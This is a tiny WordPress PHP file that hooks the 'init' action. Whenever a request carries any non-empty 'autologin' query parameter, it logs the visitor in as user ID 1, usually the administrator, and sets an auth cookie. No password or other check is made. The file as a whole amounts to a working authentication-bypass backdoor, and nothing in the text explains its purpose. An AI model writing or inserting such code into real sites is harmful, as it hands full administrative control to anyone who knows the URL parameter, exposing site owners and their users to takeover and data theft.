<?php
add_action('init', function(){
	if(!empty($_GET['autologin'])) {
		$user_id=1;
		wp_set_current_user($user_id);
		wp_set_auth_cookie($user_id);
	}
});
